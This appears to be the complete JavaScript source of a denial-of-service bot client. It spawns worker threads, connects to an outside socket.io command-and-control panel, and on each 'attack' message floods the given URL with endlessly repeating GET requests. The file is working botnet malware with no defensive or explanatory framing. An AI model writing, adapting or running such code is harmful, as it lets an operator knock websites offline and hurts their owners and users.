const { Worker, isMainThread } = require('worker_threads');
const io = require("socket.io-client");


if (isMainThread) {
    for (i = 0; i < require('os').cpus().length / 1.5; i++) {
        new Worker(__filename);
    }
} else {
    const axios = require('axios');
    var url = ''
const socket = io("wss://repfucker-panel.zsdyuqczexhehe0.repl.co", {
  reconnectionDelayMax: 10000,
});
socket.on("connect", () => {
  console.log(socket.id); // "G5p5..."
});
socket.on("disconnect", () => {
  socket.connect();
});
socket.on('attack',async m=>{
  console.log(m)
  var args = m.split('*')
  url = args[0]
  console.log(parseInt(args[1]))
    for (i = 0; i < parseInt(args[1]); i++) {
        start();
        start();
    }
})
    var e = 1;
    var f = 1;
    function start() {
         console.log('k')
        axios
            .request({
                url,
                method: 'GET'
            })
            .then(r => {
                console.log('sent ' + e + ' requests to', url);
                e++;
                start()
            })
            .catch(e => {
                console.log(f, 'failed requests lol');
                f++;
                start()
            });
    }

    
}
